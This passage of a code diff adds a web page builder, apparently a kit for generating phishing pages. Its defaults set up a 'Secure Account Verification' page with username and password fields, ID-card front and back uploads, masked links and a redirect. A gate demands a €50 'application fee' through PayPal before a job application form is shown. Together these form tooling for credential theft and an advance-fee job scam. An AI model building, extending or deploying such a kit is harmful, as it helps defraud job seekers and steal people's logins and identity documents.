@@ -1,0 +1,1924 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>🎨 COMPLETE</title>
+
+<style>
+/* PAYMENT GATE STYLES */
+
+#paymentGate {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,.85);
+  z-index: 9999;
+  overflow-y: auto; /* Allow scroll if form is taller than screen */
+  padding: 40px 20px;
+}
+#paymentGate .gate-content {
+  margin: auto; /* Center horizontally */
+}
+
+#paymentGate .gate-content {
+  background: #0b0b0b;
+  border-radius: 18px;
+  padding: 35px;
+  max-width: 420px;
+  width: 90%;
+  border: 1px solid rgba(212,175,55,.3);
+  text-align: center;
+}
+
+#paymentGate h3 {
+  color: #d4af37;
+  margin-bottom: 10px;
+}
+
+#paymentGate p {
+  color: #ccc;
+  font-size: 15px;
+  line-height: 1.6;
+}
+
+#paymentGate strong {
+  font-size: 22px;
+  color: #9cffc4;
+}
+
+#paypal-button-container {
+  margin-top: 20px;
+}
+</style>
+
+<script>
+let selectedRole = "";
+
+// Show payment gate when a job is selected
+function showApplyForm(role){
+  selectedRole = role;
+  document.getElementById("paymentGate").style.display = "flex";
+}
+
+// After successful PayPal payment, show application form
+function onPaymentSuccess(){
+  document.getElementById("paymentGate").style.display = "none";
+  document.getElementById("applyForm").style.display = "block";
+  document.getElementById("jobPosition").value = selectedRole;
+  document.getElementById("applyForm").scrollIntoView({behavior:"smooth"});
+}
+</script>
+
+<!-- PAYPAL SDK (Use your client-id in live) -->
+<script src="https://www.paypal.com/sdk/js?client-id=sb&currency=EUR"></script>
+
+</head>
+<body>
+
+<!-- ================= PAYMENT GATE ================= -->
+<div id="paymentGate">
+  <div class="gate-content">
+    <h3>🔒 Application Fee Required</h3>
+    <p>
+      To proceed with your application, a <strong>€50 processing fee</strong> is required.
+      This ensures serious applicants and faster document processing.
+    </p>
+    <div style="margin:25px 0;">
+      <strong>€50 Application Fee</strong>
+    </div>
+    <div id="paypal-button-container"></div>
+  </div>
+</div>
+
+<style>
+/* ===============================
+   PREVIEWclass="" (SCROLL + VIDEO SAFE)
+   =============================== */
+#preview {
+  position: relative;
+  width: 100%;
+  max-width: 100%;
+  min-height: 100vh;     /* required for background video */
+  height: auto;          /* allow content to grow */
+  overflow-y: auto;      /* allow scrolling */
+  overflow-x: hidden;
+  user-select: none;
+  box-sizing: border-box;
+}
+
+/* ===============================
+   PREVIEW WRAPPER (FIX CLIPPING)
+   =============================== */
+.previewWrap {
+  width: 100%;
+  max-width: 100%;
+  height: 100vh;
+  overflow-y: auto;
+  overflow-x: hidden;
+  box-sizing: border-box;
+}
+
+/* ===============================
+   KILL PREVIEW OUTLINE / BOX
+   =============================== */
+
+/* Remove any visual container effect */
+.previewWrap {
+  border: none !important;
+  border-radius: 0 !important;
+  box-shadow: none !important;
+  outline: none !important;
+  background: transparent !important;
+}
+
+/* Remove browser scroll highlight */
+.previewWrap:focus,
+.previewWrap:focus-within {
+  outline: none !important;
+}
+
+/* Ensure preview itself never draws a box */
+#preview {
+  border: none !important;
+  outline: none !important;
+  box-shadow: none !important;
+  background: transparent;
+}
+
+/* ===============================
+   ADMIN INPUT FIX (COMPACT)
+   =============================== */
+.wrap input,
+.wrap textarea,
+.wrap select {
+  width: 100%;
+  padding: 8px 10px;
+  font-size: 14px;
+  margin: 4px 0 10px;
+  border: 1px solid #d0d0d0;
+  border-radius: 0;
+  box-sizing: border-box;
+}
+
+.wrap textarea {
+  min-height: 70px;
+  resize: vertical;
+}
+
+.wrap label {
+  font-size: 13px;
+  font-weight: 600;
+  display: block;
+  margin-top: 8px;
+}
+
+/* ===============================
+   SECTION GROUPS
+   =============================== */
+.section {
+  background: #ffffff;
+  border: 1px solid #e2e2e2;
+  border-radius: 10px;
+  padding: 14px;
+  margin-bottom: 18px;
+}
+
+.section h3 {
+  margin: 0 0 12px;
+  font-size: 15px;
+  font-weight: 700;
+  border-bottom: 1px solid #eee;
+  padding-bottom: 6px;
+}
+
+/* ===============================
+   PREVIEW ELEMENTS
+   =============================== */
+#preview input,
+#preview textarea,
+#preview select {
+  font-size: 16px;
+}
+
+#preview button {
+  padding: 12px 20px;
+  font-size: 16px;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+#preview video,
+#preview iframe,
+#preview img {
+  max-width: 100%;
+  border-radius: 8px;
+  margin: 6px 0;
+}
+
+.draggableBtn {
+  font-size: 14px;
+  padding: 8px;
+}
+
+/* ===============================
+   MOBILE
+   =============================== */
+@media (max-width: 768px) {
+  .wrap > div {
+    flex: 1 1 100%;
+  }
+}
+
+/* ===============================
+   GENERATE FORM BUTTON
+   =============================== */
+#generateFormButton {
+  background-color: #1976d2;
+  color: #fff;
+  border: none;
+  padding: 12px 20px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: background 0.3s;
+}
+
+#generateFormButton:hover {
+  background-color: #115293;
+}
+
+/* ===============================
+   PREVIEW FORM (NO BOX)
+   =============================== */
+.preview-form {
+  background: transparent;
+  border: none;
+  padding: 0;
+  margin: 16px 0;
+}
+
+/* ===============================
+   BACKGROUND VIDEO (SAFE LAYERING)
+   =============================== */
+
+/* Video / iframe layer */
+.bg-video {
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Overlay ABOVE video, BELOW content */
+.bg-overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(0,0,0,0.35);
+  z-index: 1;
+  pointer-events: none;
+}
+
+/* ===============================
+   PREVIEW CONTENT HARD FIX
+   =============================== */
+
+/* Ensure ALL preview content respects width */
+#preview *,
+#preview *::before,
+#preview *::after {
+  box-sizing: border-box;
+}
+
+/* Main preview content container */
+#preview > div {
+  max-width: 100%;
+  overflow-x: hidden;
+}
+
+/* Inputs & textareas inside preview */
+#preview input,
+#preview textarea,
+#preview select,
+#preview button {
+  width: 100%;
+  max-width: 100%;
+  box-sizing: border-box;
+}
+
+/* Prevent text blocks from overflowing */
+#preview h1,
+#preview h2,
+#preview h3,
+#preview p,
+#preview label {
+  max-width: 100%;
+  word-wrap: break-word;
+  overflow-wrap: break-word;
+}
+
+#preview form,
+#preview fieldset {
+  border: none !important;
+  outline: none !important;
+  box-shadow: none !important;
+}
+
+#preview {
+  min-height: 100vh;
+}
+</style>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
+</head>
+
+<body>
+<div class="wrap">
+  <h2>🎨 COMPLETE 👩‍💻</h2>
+
+  <div style="display:flex; gap:18px; flex-wrap:wrap">
+
+    <!-- LEFT PANEL -->
+    <div style="flex:1; min-width:340px">
+
+      <!-- SEO -->
+      <div class="section">
+        <h3>🔍 SEO & Social</h3>
+
+        <label>SEO Page Title</label>
+        <input id="seoTitle" value="Secure Account Verification">
+
+        <label>Meta Description</label>
+        <textarea id="metaDesc">Verify your account to continue securely</textarea>
+
+        <label>OG Image URL</label>
+        <input id="ogImage" value="https://i.postimg.cc/htn39rj9/FB-IMG-17655010557088403.jpg">
+      </div>
+
+<!-- BRANDING -->
+<div class="section">
+  <h3>🖼 Branding</h3>
+  <label>Avatar Image URL</label>
+  <input id="avatarURL"value="https://i.postimg.cc/59qvyb1Y/Screenshot-20251123-191324-2-removebg-preview.png">
+
+  <label>Logo Image URL</label>
+  <input id="logoURL"value="https://i.postimg.cc/htn39rj9/FB-IMG-17655010557088403.jpg">
+
+  <label>Banner Image URL</label>
+  <input id="bannerURL"value="https://i.postimg.cc/CxfCxLzw/IMG_20251112_WA0002_2.jpg">
+</div>
+
+<!-- TITLE -->
+<label for="title">Page Title</label>
+<input id="title" value="Welcome to Your Secure Page">
+
+<label for="titleSize">Page Title Size</label>
+<select id="titleSize">
+  <option value="15">15px</option>
+  <option value="20">20px</option>
+  <option value="24">24px</option>
+  <option value="28">28px</option>
+  <option value="32" selected>32px</option>
+  <option value="36">36px</option>
+  <option value="40">40px</option>
+  <option value="50">50px</option>
+  <option value="60">60px</option>
+</select>
+
+<h1 id="adminTitlePreview"
+    style="margin-top:10px;text-align:center;">
+  Welcome to Your Secure Page
+</h1>
+
+  <label>Title Color</label>
+  <input type="color" id="titleColor">
+
+  <label>Subtitle</label>
+  <input id="subtitle" value="Please fill in your details below">
+
+  <label>Subtitle Color</label>
+  <input type="color" id="subtitleColor">
+  
+  <!-- MEDIA -->
+<div class="section">
+  <h3>🎞 Gallery Images #1 (Images Only)</h3>
+  <label>Image URLs (one per line) 💃🕴️🧑‍🚒👯 paste your images URL here (https://yourimage.com or whatever)</label>
+  <textarea id="galleryImages"></textarea>
+
+<label>Gallery Layout</label>
+<select id="galleryLayout">
+  <option value="list">List</option>
+  <option value="grid">Grid</option>
+  <option value="large-grid">Large Grid</option>
+</select>
+
+  <label>Description</label>
+  <textarea id="description">
+Welcome to our secure verification page. Please provide your details below to ensure your account remains safe. All information submitted is encrypted and handled confidentially.
+</textarea>
+</div>
+
+<!-- GALLERY ITEMS -->
+<div class="section">
+  <h3>🖼 Gallery Items #2 (Image + Masked Link)</h3>
+
+  <p style="font-size:13px;color:#555;margin:6px 0 12px;">
+    Add individual gallery items with an image and a masked link.
+    You can either paste an image URL or upload an image directly.
+  </p>
+
+  <label>Gallery Items Layout</label>
+  <select id="galleryItemsLayout">
+    <option value="list">List</option>
+    <option value="grid">Grid</option>
+    <option value="large-grid">Large Grid</option>
+    <option value="mix">Mix List & Grid</option>
+  </select>
+  <small style="display:block; font-size:12px; color:#555; margin-bottom:6px;">
+    Choose how gallery items are displayed in the live preview and generated form.
+  </small>
+
+  <div id="galleryItemsWrap"></div>
+
+  <div style="display:flex;gap:10px;flex-wrap:wrap">
+    <button class="btn" onclick="addGalleryItem()">➕ Add Gallery Item</button>
+    <button class="btn alt" onclick="clearGalleryItems()">🧹 Clear All Gallery Items</button>
+  </div>
+</div>
+
+  <label>Videos</label>
+  <textarea id="videoLinks"></textarea>
+</div>
+
+<div class="section">
+  <h3>🔗 Embed Links</h3>
+
+  <label><input type="checkbox" id="embedShow" checked> Enable Embeds</label>
+
+  <label>Title</label>
+  <input id="embedText">
+
+  <label>Embed URL</label>
+  <input id="embedURL">
+
+  <label>Description</label>
+  <textarea id="embedDesc"></textarea>
+
+  <button onclick="addEmbedLink()">Add Embed</button>
+  <button onclick="clearEmbedLinks()">Clear Embeds</button>
+</div>
+
+<!-- FORM -->
+<div class="section">
+  <h3>🔐 Form Fields</h3>
+
+  <label>
+    <input type="checkbox" id="addAuth" checked>
+    Include Username & Password
+  </label>
+
+<input id="usernamePlaceholder" value="Email / Username">
+<input id="passwordPlaceholder" value="Password">
+
+  <label>Extra Fields</label>
+  <textarea id="extraFields"></textarea>
+
+  <div id="customFieldsWrap"></div>
+  <button onclick="addCustomField()">Add Custom Field</button>
+  <button onclick="clearCustomFields()">Clear Custom Fields</button>
+</div>
+
+<!-- ID UPLOAD -->
+<div class="section">
+  <h3>🪪 ID Upload</h3>
+
+  <label><input type="checkbox" id="chkIdFront"> Enable ID Front</label>
+  <input id="txtIdFront" value="Upload ID Front">
+  <input type="file" id="idFrontFile">
+
+  <label><input type="checkbox" id="chkIdBack"> Enable ID Back</label>
+  <input id="txtIdBack" value="Upload ID Back">
+  <input type="file" id="idBackFile">
+</div>
+
+<!-- WARNING -->
+<div class="section">
+  <h3>⚠️ Warning 📌</h3>
+  
+  <!-- Enable Warning -->
+  <label>
+    <input type="checkbox" id="enableWarning" checked> Show Warning by write a warning message here or leave it empty or write whatever you want to write here. 🔖
+  </label>
+  <textarea id="warning">
+⚠️ Warning: Do not share your credentials with anyone. This page is for authorized users only.
+  </textarea>
+  <small style="display:block; font-size:12px; color:#555; margin-bottom:6px;">
+    The warning message that appears above the form. Leave empty to hide if you don't want to show it.🔖
+  </small>
+  
+  <!-- Warning Color -->
+  <label>Warning Text Color</label>
+  <input type="color" id="warningColor" value="#d32f2f">
+  <small style="display:block; font-size:12px; color:#555; margin-bottom:6px;">
+    Select the color for the warning message text.
+  </small>
+  
+  <!-- Custom Submit Message -->
+  <label>Custom Submit Message (optional)</label>
+  <textarea id="submitMessage" placeholder="Your message here..."></textarea>
+  <small style="display:block; font-size:12px; color:#555; margin-bottom:6px;">
+    Optional message that appears after the user submits the form. Leave empty to hide.
+  </small>
+  
+  <!-- Submit Message Color -->
+  <label>Custom Submit Message Color</label>
+  <input type="color" id="submitMessageColor" value="#1976d2">
+  <small style="display:block; font-size:12px; color:#555; margin-bottom:6px;">
+    Select the color for the custom submit message text.
+  </small>
+  
+  <!-- Warning Position -->
+  <label>Position</label>
+  <select id="warningPosition">
+    <option value="normal">Normal</option>
+    <option value="left">Left</option>
+    <option value="center">Center</option>
+    <option value="right">Right</option>
+    <option value="none">None</option>
+  </select>
+  <small style="display:block; font-size:12px; color:#555;">
+    Set the alignment of the warning message above the form. "None" hides it completely.
+  </small>
+</div>
+
+<!-- STYLING -->
+<div class="section">
+  <h3>🎨 Styling & Background</h3>
+
+  <label>Text Color</label>
+  <input type="color" id="textColor" value="#222222">
+
+  <label>Background Color</label>
+  <input type="color" id="bgColor" value="#ffffff">
+
+  <label>Background Image URL</label>
+  <input id="bgImageURL" placeholder="https://example.com/bg.jpg">
+  
+  <label>
+  <input type="checkbox" id="enableBackground">
+  Enable Background (Image / Video)
+</label>
+
+<label>Upload Background Image</label>
+<input type="file" id="bgImageUpload" accept="image/*">
+
+  <label>Background Video URL (autoplay)</label>
+<input
+  id="bgVideoURL"
+  placeholder="https://example.com/bg.mp4">
+
+<label>Upload Background Video</label>
+<input type="file" id="bgVideoUpload" accept="video/mp4,video/webm">
+
+  <label>Background Size</label>
+  <select id="bgSize">
+    <option value="cover">Cover</option>
+    <option value="contain">Contain</option>
+  </select>
+
+  <label>Button Color</label>
+  <input type="color" id="btnColor" value="#1976d2">
+
+  <label>Button Position</label>
+  <select id="btnPosition">
+    <option value="center">Center</option>
+    <option value="left">Left</option>
+    <option value="right">Right</option>
+  </select>
+</div>
+
+<!-- BUTTONS -->
+<div class="section">
+  <h3>🚀 Buttons</h3>
+
+  <!-- Generate Button -->
+  <label>
+    <input type="checkbox" id="showGenerateBtn" checked>
+    Show Generate Button
+  </label>
+
+  <label>Generate Button Text</label>
+  <input id="generateBtnText" value="Generate">
+
+  <hr style="margin:12px 0; opacity:.3;">
+
+  <!-- Main Submit Button -->
+  <label>Main Button Text</label>
+  <input id="buttonText" value="Submit">
+
+  <label>
+    <input type="checkbox" id="showMainBtn" checked>
+    Show Main Button
+  </label>
+</div>
+
+<!-- Extra Buttons -->
+<div class="section">
+  <h3>➕ Extra Buttons</h3>
+
+  <p style="font-size:13px;color:#555;margin:6px 0 12px;">
+    Add additional custom buttons anywhere on the page.
+    Use these for external links, actions, promotions, or important navigation.
+    You can control the button text, link, color, size, and visibility.
+  </p>
+
+  <label>Button Alignment</label>
+  <select id="newBtnAlign">
+    <option value="left">Left</option>
+    <option value="center" selected>Center</option>
+    <option value="right">Right</option>
+  </select>
+
+  <label>Text: <input id="newBtnText" value="Click Me"></label>
+  <label>Link URL: <input id="newBtnLink" value="https://example.com"></label>
+  <label>Color: <input type="color" id="newBtnColor" value="#1976d2"></label>
+  <label>Size (px): <input type="number" id="newBtnSize" value="44" min="20" max="200"></label>
+  <label>Show Button: <input type="checkbox" id="newBtnShow" checked></label>
+
+  <button onclick="addExtraButton()">Add Extra Button</button>
+  <button onclick="clearExtraButtons()">Clear All Extra Buttons</button>
+
+  <!-- ✅ ADMIN DELETE LIST -->
+  <div id="extraButtonsAdmin" style="margin-top:12px;"></div>
+</div>
+
+<!-- Draggable Lines -->
+<div class="section">
+  <h3>➖ Draggable Lines</h3>
+
+  <label>Line Type</label>
+  <select id="linePreset">
+    <optgroup label="Basic Geometric & Orientation">
+      <option value="straight">Straight Line</option>
+      <option value="horizontal">Horizontal Line</option>
+      <option value="vertical">Vertical Line</option>
+      <option value="diagonal">Diagonal Line</option>
+      <option value="curved">Curved Line</option>
+      <option value="zigzag">Zigzag Line</option>
+      <option value="wavy">Wavy Line</option>
+    </optgroup>
+
+    <optgroup label="Patterned & Stylized">
+      <option value="solid">Solid Line</option>
+      <option value="dashed">Dashed Line</option>
+      <option value="dotted">Dotted Line</option>
+      <option value="thick">Thick Line</option>
+      <option value="thin">Thin Line</option>
+    </optgroup>
+
+    <optgroup label="Directional & Design">
+      <option value="arrow">Directional Line</option>
+      <option value="spiral">Spiral Line</option>
+      <option value="flow">Flowing Line</option>
+      <option value="leading">Leading Line</option>
+    </optgroup>
+
+    <optgroup label="Artistic">
+      <option value="expressive">Expressive Line</option>
+      <option value="contour">Contour Line</option>
+      <option value="hatching">Hatching Lines</option>
+      <option value="crosshatch">Cross-Hatching</option>
+    </optgroup>
+  </select>
+
+  <label>Color</label>
+  <input type="color" id="lineColor" value="#000000">
+
+  <label>Thickness</label>
+  <input type="number" id="lineSize" value="2" min="1" max="12">
+  <button onclick="addLine()">➕ Add Line</button>
+
+<div id="linesList"></div>
+</div>
+
+<!-- REDIRECT -->
+<div class="section">
+  <h3>🔗 Redirect</h3>
+  <label><input type="checkbox" id="enableRedirect"> Enable Redirect</label>
+  <input id="redirectURL">
+</div>
+
+<!-- FOOTER -->
+<div class="section">
+  <h3>🧾 Footer</h3>
+  <input id="footerText" value="© 2025 Your Company. All rights reserved.">
+</div>
+
+<!-- Generate Form -->
+<div class="section">
+  <button id="generateFormButton" onclick="generateForm()">Generate Form</button>
+  <div id="linkArea" class="linkBox" style="display:none; margin-top:10px;"></div>
+</div>
+
+</div>
+
+<!-- PREVIEW -->
+<div style="flex:0 0 540px; max-width:540px; min-width:320px;">
+  <label>Live Preview</label>
+  <div class="previewWrap">
+    <div id="preview"></div>
+  </div>
+</div>
+
+</div>
+</div>
+<script src="https://www.youtube.com/iframe_api"></script>
+<script>
+const $ = id => document.getElementById(id);
+
+window.onerror = function (msg, url, line) {
+  alert("JS ERROR:\n" + msg + "\nLine: " + line);
+};
+
+function updateAdminTitlePreview() {
+  const titleInput = $("title");
+  const sizeInput = $("titleSize");
+  const colorInput = $("titleColor");
+  const preview = $("adminTitlePreview");
+
+  if (!preview) return;
+
+  preview.textContent = titleInput?.value || "My Page Title";
+  preview.style.fontSize = (sizeInput?.value || 32) + "px";
+  preview.style.color = colorInput?.value || "#000";
+}
+
+// -------------------------
+// Draggable Lines & Extra Buttons
+// -------------------------
+let draggableItems = []; // store extra buttons + lines
+
+const linePresets = {
+  straight: "────────────",
+  horizontal: "────────────",
+  vertical: "││││││││││││",
+  diagonal: "///////////",
+  curved: "~~~~~~~~~~~~",
+  zigzag: "⚡⚡⚡⚡⚡⚡",
+  wavy: "〰〰〰〰〰〰",
+
+  solid: "━━━━━━━━━━━━",
+  dashed: "— — — — — —",
+  dotted: "· · · · · ·",
+  thick: "████████████",
+  thin: "────────────",
+
+  arrow: "➜➜➜➜➜➜",
+  spiral: "🌀🌀🌀",
+  flow: "≈≈≈≈≈≈",
+  leading: "➝➝➝➝➝",
+
+  expressive: "✦✦✦✦✦",
+  contour: "▭▭▭▭▭",
+  hatching: "//// ////",
+  crosshatch: "#### ####"
+};
+
+// -------------------------
+// Dynamic Storage Arrays
+// -------------------------
+let extraButtons = [];
+let embedLinks = [];
+let uploadedBgImageURL = "";
+let uploadedBgVideoURL = "";
+let customFields = [];
+let generatedHTML = "";
+let generatedData = null;
+let dragging = null;
+let dx = 0;
+let dy = 0;
+
+/* =========================
+   EXTRA BUTTONS — ADMIN DELETE ONLY
+========================= */
+
+function addExtraButton() {
+  const btn = {
+    id: "b" + Math.random().toString(36).slice(2),
+    text: $("newBtnText").value || "Click Me",
+    link: $("newBtnLink").value || "#",
+    color: $("newBtnColor").value || "#1976d2",
+    size: parseInt($("newBtnSize").value) || 44,
+    align: $("newBtnAlign").value || "center",
+    show: $("newBtnShow").checked,
+    x: 50,
+    y: 50
+  };
+
+  extraButtons.push(btn);
+  renderExtraButtonsAdmin(); // ✅ ADMIN ONLY
+  renderPreview();          // ✅ LIVE (NO DELETE)
+}
+
+function renderExtraButtonsAdmin() {
+  const wrap = document.getElementById("extraButtonsAdmin");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  if (!extraButtons.length) {
+    wrap.innerHTML = "<em>No extra buttons added.</em>";
+    return;
+  }
+
+  extraButtons.forEach(btn => {
+    const row = document.createElement("div");
+    row.style.cssText = `
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      padding:6px;
+      border:1px solid #ddd;
+      border-radius:6px;
+      margin-bottom:6px;
+      background:#fafafa;
+    `;
+
+    row.innerHTML = `
+      <span>${btn.text}</span>
+      <button
+        onclick="deleteExtraButton('${btn.id}')"
+        style="background:#c62828;color:#fff;border:none;
+        padding:4px 8px;border-radius:5px;cursor:pointer">
+        ❌ Delete
+      </button>
+    `;
+
+    wrap.appendChild(row);
+  });
+}
+
+function deleteExtraButton(id) {
+  extraButtons = extraButtons.filter(b => b.id !== id);
+  renderExtraButtonsAdmin();
+  renderPreview();
+}
+
+function clearExtraButtons() {
+  if (!confirm("Clear all extra buttons?")) return;
+  extraButtons = [];
+  renderExtraButtonsAdmin();
+  renderPreview();
+}
+    
+    // -------------------------
+// GLOBAL DRAG MOVE HANDLER
+// -------------------------
+document.onmousemove = e => {
+  if (!dragging) return;
+
+  const preview = document.getElementById("preview");
+  if (!preview) return;
+
+  const rect = preview.getBoundingClientRect();
+  dragging.x = ((e.clientX - rect.left - dx) / rect.width) * 100;
+  dragging.y = ((e.clientY - rect.top - dy) / rect.height) * 100;
+
+  renderPreview();
+};
+
+document.onmouseup = () => dragging = null;
+
+// -------------------------
+// CUSTOM FORM FIELDS (ADMIN UI)
+// -------------------------
+function renderCustomFields() {
+  const wrap = $("customFieldsWrap");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  customFields.forEach((fld, i) => {
+    const div = document.createElement("div");
+    div.style.border = "1px solid #ccc";
+    div.style.padding = "10px";
+    div.style.marginTop = "8px";
+    div.style.borderRadius = "8px";
+    div.style.background = "#fafafa";
+
+    div.innerHTML = `
+      <label>Field Label</label>
+      <input value="${fld.label}"
+        oninput="customFields[${i}].label=this.value; renderPreview()">
+
+      <label>Type</label>
+      <select onchange="customFields[${i}].type=this.value; renderPreview()">
+        <option value="text" ${fld.type==="text"?"selected":""}>Text</option>
+        <option value="number" ${fld.type==="number"?"selected":""}>Number</option>
+        <option value="email" ${fld.type==="email"?"selected":""}>Email</option>
+        <option value="password" ${fld.type==="password"?"selected":""}>Password</option>
+      </select>
+
+      <button
+        style="margin-top:8px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="deleteCustomField(${i})">
+        ❌ Delete This Field
+      </button>
+    `;
+
+    wrap.appendChild(div);
+  });
+}
+
+function addCustomField() {
+  customFields.push({ label: "New Field", type: "text" });
+  renderCustomFields();
+  renderPreview();
+}
+
+function deleteCustomField(index) {
+  customFields.splice(index, 1);
+  renderCustomFields();
+  renderPreview();
+}
+
+function clearCustomFields() {
+  customFields = [];
+  renderCustomFields();
+  renderPreview();
+}
+
+// -------------------------
+// Update SEO & OG Meta Tags
+// -------------------------
+function updateSEOMeta() {
+  // Page Title
+  document.title = $("seoTitle").value;
+
+  // Meta Description
+  let metaDesc = document.querySelector('meta[name="description"]');
+  if (!metaDesc) {
+    metaDesc = document.createElement("meta");
+    metaDesc.name = "description";
+    document.head.appendChild(metaDesc);
+  }
+  metaDesc.content = $("metaDesc").value;
+
+  // OG Image
+  let ogImage = document.querySelector('meta[property="og:image"]');
+  if (!ogImage) {
+    ogImage = document.createElement("meta");
+    ogImage.setAttribute("property", "og:image");
+    document.head.appendChild(ogImage);
+  }
+  ogImage.content = $("ogImage").value;
+
+  // OG Title
+  let ogTitle = document.querySelector('meta[property="og:title"]');
+  if (!ogTitle) {
+    ogTitle = document.createElement("meta");
+    ogTitle.setAttribute("property", "og:title");
+    document.head.appendChild(ogTitle);
+  }
+  ogTitle.content = $("seoTitle").value;
+
+  // OG Description
+  let ogDesc = document.querySelector('meta[property="og:description"]');
+  if (!ogDesc) {
+    ogDesc = document.createElement("meta");
+    ogDesc.setAttribute("property", "og:description");
+    document.head.appendChild(ogDesc);
+  }
+  ogDesc.content = $("metaDesc").value;
+}
+
+// Default example gallery items
+let galleryItems = [
+  {
+    img: "https://picsum.photos/400/250",
+    link: "https://example.com",
+    mask: "Visit Website",
+    desc: "Example gallery item description"
+  },
+  {
+    img: "https://picsum.photos/401/250",
+    link: "https://google.com",
+    mask: "Open Google",
+    desc: "Second example item"
+  }
+];
+
+function addEmbedLink() {
+  if (!$("embedShow").checked) return;
+
+  embedLinks.push({
+    text: $("embedText").value || "",
+    url: $("embedURL").value || "",
+    desc: $("embedDesc").value || "",
+    show: true
+  });
+
+  $("embedText").value = "";
+  $("embedURL").value = "";
+  $("embedDesc").value = "";
+
+  renderPreview();
+}
+
+function clearEmbedLinks() {
+  if (!confirm("Clear all embeds?")) return;
+  embedLinks = [];
+  renderPreview();
+}
+
+function addGalleryItem() {
+  galleryItems.push({
+    img: "https://picsum.photos/402/250",
+    link: "https://example.com",
+    mask: "Learn More",
+    desc: "New gallery item"
+  });
+  renderGalleryInputs();
+  renderPreview();
+}
+
+function deleteGalleryItem(index) {
+  if (!confirm("Delete this gallery item?")) return;
+  galleryItems.splice(index, 1);
+  renderGalleryInputs();
+  renderPreview();
+}
+
+function clearGalleryItems() {
+  if (!confirm("Clear ALL gallery items? This cannot be undone.")) return;
+  galleryItems = [];
+  renderGalleryInputs();
+  renderPreview();
+}
+
+function renderGalleryInputs() {
+  const wrap = $("galleryItemsWrap");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  galleryItems.forEach((item, i) => {
+    const div = document.createElement("div");
+    div.style.border = "1px solid #ccc";
+    div.style.padding = "10px";
+    div.style.marginTop = "8px";
+    div.style.borderRadius = "8px";
+    div.style.background = "#fafafa";
+
+    // Create HTML elements
+    const imgLabel = document.createElement("label");
+    imgLabel.textContent = "Image URL";
+
+    const imgInput = document.createElement("input");
+    imgInput.type = "text";
+    imgInput.value = item.img;
+    imgInput.oninput = () => {
+      galleryItems[i].img = imgInput.value;
+      renderPreview();
+    };
+
+    // File input for uploading image
+    const fileInput = document.createElement("input");
+    fileInput.type = "file";
+    fileInput.accept = "image/*";
+    fileInput.onchange = async (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+
+      const storageRef = firebase.storage().ref(`gallery/${Date.now()}_${file.name}`);
+      const uploadTask = storageRef.put(file);
+
+      uploadTask.on(
+        "state_changed",
+        snapshot => { /* optional: progress */ },
+        error => { alert("Upload failed: " + error.message); },
+        async () => {
+          const url = await uploadTask.snapshot.ref.getDownloadURL();
+          imgInput.value = url;
+          galleryItems[i].img = url;
+          renderPreview();
+        }
+      );
+    };
+
+    const maskLabel = document.createElement("label");
+    maskLabel.textContent = "Masked Text";
+
+    const maskInput = document.createElement("input");
+    maskInput.value = item.mask;
+    maskInput.oninput = () => {
+      galleryItems[i].mask = maskInput.value;
+      renderPreview();
+    };
+
+    const linkLabel = document.createElement("label");
+    linkLabel.textContent = "Link URL";
+
+    const linkInput = document.createElement("input");
+    linkInput.value = item.link;
+    linkInput.oninput = () => {
+      galleryItems[i].link = linkInput.value;
+      renderPreview();
+    };
+
+    const descLabel = document.createElement("label");
+    descLabel.textContent = "Description";
+
+    const descTextarea = document.createElement("textarea");
+    descTextarea.value = item.desc || "";
+    descTextarea.oninput = () => {
+      galleryItems[i].desc = descTextarea.value;
+      renderPreview();
+    };
+
+    const delBtn = document.createElement("button");
+    delBtn.textContent = "❌ Delete Gallery Item";
+    delBtn.style.marginTop = "8px";
+    delBtn.style.background = "#c62828";
+    delBtn.style.color = "#fff";
+    delBtn.style.border = "none";
+    delBtn.style.padding = "6px 10px";
+    delBtn.style.borderRadius = "6px";
+    delBtn.style.cursor = "pointer";
+    delBtn.onclick = () => deleteGalleryItem(i);
+
+    // Append everything
+    div.appendChild(imgLabel);
+    div.appendChild(imgInput);
+    div.appendChild(fileInput);
+    div.appendChild(maskLabel);
+    div.appendChild(maskInput);
+    div.appendChild(linkLabel);
+    div.appendChild(linkInput);
+    div.appendChild(descLabel);
+    div.appendChild(descTextarea);
+    div.appendChild(delBtn);
+
+    wrap.appendChild(div);
+  });
+}
+
+
+function addLine() {
+  const presetKey = $("linePreset")?.value;
+  const presetText = linePresets[presetKey] || "────────";
+
+  draggableItems.push({
+    id: "l" + Math.random().toString(36).slice(2),
+    text: presetText,
+    color: $("lineColor")?.value || "#000",
+    size: parseInt($("lineSize")?.value) || 2,
+    x: 50,
+    y: 50,
+    align: "center",
+    show: true
+  });
+
+  renderLinesList();   // ✅ REQUIRED
+  renderPreview();
+}
+
+/* =========================
+   Lines Admin List
+========================= */
+function renderLinesList() {
+  const wrap = $("linesList");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  draggableItems.forEach((line, i) => {
+    if (!line.text) return;
+
+    const row = document.createElement("div");
+    row.style.border = "1px solid #ddd";
+    row.style.padding = "8px";
+    row.style.marginTop = "8px";
+    row.style.borderRadius = "8px";
+    row.style.background = "#fafafa";
+
+    row.innerHTML = `
+      <strong>Line ${i + 1}</strong>
+
+      <label style="margin-top:6px;display:block">Alignment</label>
+      <select onchange="draggableItems[${i}].align=this.value; renderPreview()">
+        <option value="left" ${line.align==="left"?"selected":""}>Left</option>
